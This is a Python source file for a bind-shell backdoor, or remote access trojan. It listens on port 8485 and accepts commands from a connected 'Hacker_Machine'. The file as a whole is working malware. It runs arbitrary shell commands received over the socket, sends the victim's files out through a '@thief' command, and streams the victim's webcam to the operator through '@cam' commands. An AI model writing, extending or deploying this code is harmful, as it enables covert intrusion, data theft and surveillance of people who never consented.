import socket     
import threading as the 
import subprocess as pipe
import os
import struct
import time
import pickle
import cv2

IP_Adress = socket.gethostname()
print(socket.gethostbyname(IP_Adress))
global Current_Path

Network = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Network.bind((socket.gethostbyname(IP_Adress),8485))
Network.listen()
connection = Network.makefile('wb')

def Cam_Recv():
    cons ,adre = Network.accept()
    data = b""
    payload_size = struct.calcsize(">L")
    while True:
        while len(data) < payload_size:
            data += cons.recv(4096)
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack(">L", packed_msg_size)[0]
        while len(data) < msg_size:
            data += cons.recv(4096)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        cv2.imshow('Hacker',frame)
        cv2.waitKey(1)

def Cam_Send():
    Con , adress = Network.accept()
    Cam = cv2.VideoCapture(0)
    Cam.set(3, 1920)
    Cam.set(4, 1080)
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
    while True:
        ret, frame = Cam.read()
        result, frame = cv2.imencode('.jpeg', frame, encode_param)
        data = pickle.dumps(frame, 0)
        size = len(data)
        Con.sendall(struct.pack(">L", size) + data)
    Cam.release()

class Shell_BackDoor(the.Thread):
    def __init__(self) -> None:
        super(Shell_BackDoor,self).__init__()
        self._stop_event = the.Event()

    def stop(self):
        self._stop_event.set()

    def join(self, *args, **kwargs):
        self.stop()
        super(Shell_BackDoor,self).join(*args, **kwargs)

    def run(self):
        while not self._stop_event.is_set():
            Current_Path=os.getcwd()
            Command = Hacker_Machine.recv(2048).decode()

            if Command.split(" ")[0] == "cd":
                try:
                    os.chdir(Command.split(" ")[1])
                    Current_Path =  os.getcwd()
                    Hacker_Machine.send(f"CURRENT DIREACTORY : {Current_Path}".encode())
                    Hacker_Machine.send(Current_Path.encode())
                except:
                    Hacker_Machine.send("Error On Direactory".encode())
                    Hacker_Machine.send(Current_Path.encode())
            elif Command.split(" ")[0] == "@thief":
                f = open(Current_Path + "\\" + Command.split(" ")[1],'rb')
                data = f.read(1024)
                while (data):
                    Hacker_Machine.send(data)
                    print('Sent ',repr(data))
                    data = f.read(1024)
                f.close()
                Hacker_Machine.send("[0_0] Successfully File Thiefed ::".encode())
            elif Command.split(" ")[0] == "@cam":
                if Command.split(" ")[1] == "cast":
                    Cam_rec = the.Thread(target = Cam_Recv).start()
                    Hacker_Machine.send("CAmera Connection SUccefully COnnected".encode())
                elif Command.split(" ")[1] == "show":
                    Cam_send = the.Thread(target = Cam_Send).start()
                    Hacker_Machine.send("CAmera Connection SUccefully COnnected".encode())
            elif Command.split(" ")[0] == "dir":
                Shell = pipe.Popen(f"cd {Current_Path} & "+Command,shell=True,stdout=pipe.PIPE,stderr=pipe.PIPE)
                output = Shell.stdout.read()
                Hacker_Machine.send(str(output).encode())
            else:
                Shell = pipe.Popen(f"cd {Current_Path} & "+Command,shell=True,stdout=pipe.PIPE,stderr=pipe.PIPE)
                output = Shell.stdout.read()
                Hacker_Machine.send(str(output).encode())
                Hacker_Machine.send(Current_Path.encode())



Hacker_Machine, Hacker_Adress = Network.accept()

_Shell = Shell_BackDoor().run()
